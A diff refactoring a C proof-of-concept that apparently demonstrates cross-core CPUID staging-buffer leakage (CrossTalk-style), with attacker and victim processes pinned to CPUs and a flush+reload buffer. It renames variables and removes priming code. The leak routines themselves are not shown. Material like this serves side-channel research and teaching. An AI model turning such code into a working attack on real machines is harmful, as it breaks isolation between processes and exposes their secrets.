@@ -10,9 +10,6 @@
 
 #define CYCLE_LENGTH (uint64_t)600000
 
-// cpu_byte_0 = first byte of CPUID brand string 1
-// thermal_byte_0 = same byte in the staging buffer, but contains the value after executing cpuid with leaf 0x6
-uint8_t cpu_byte_0, thermal_byte_0;
 
 void attacker_write_char(int cpu) {
     set_processor_affinity(cpu);
@@ -79,28 +76,22 @@ void attacker_read_char(int cpu, void *mem) {
 int main(int argc, char **args) {
     printf("Demo 3: Transmitting strings across cores.\n\n");
     _page_size = getpagesize();
-    get_same_core_cpus(&reader_cpu, &writer_cpu);
-    offcore_cpu = reader_cpu + 1;
-    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu,
+    get_same_core_cpus(&attacker_cpu1, &attacker_cpu2);
+    offcore_cpu = attacker_cpu1 + 1;
+    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", attacker_cpu1, attacker_cpu2,
            offcore_cpu);
     fflush(stdout);
     time_t tm;
     time(&tm);
     srand(tm);
-    uint8_t *mem =
-            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
-                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
-    memset(mem, 0xFF, _page_size * 256);
+    uint8_t * mem = allocate_flush_reload_buffer();
     crosstalk_init(argc, args);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
-    byte_32 = prime_and_get_cpuid(CPUID_BRAND_STRING_3_PRIMITIVE);
-    cpu_byte_0 = prime_and_get_cpuid(CPUID_BRAND_STRING_1_PRIMITIVE);
-    thermal_byte_0 = prime_and_get_cpuid(CPUID_THERMAL_STRING_PRIMITIVE);
     pid = fork();
-    if (!pid) victim_cpuid(0xABCDEF, writer_cpu);
+    if (!pid) victim_cpuid(0xABCDEF, attacker_cpu2);
     pid2 = fork();
     if (!pid2) attacker_write_char(offcore_cpu);
-    attacker_read_char(reader_cpu, mem);
+    attacker_read_char(attacker_cpu1, mem);
     kill(pid2, SIGKILL);
     kill(pid, SIGKILL);
     munmap(mem - 1, _page_size * 257);
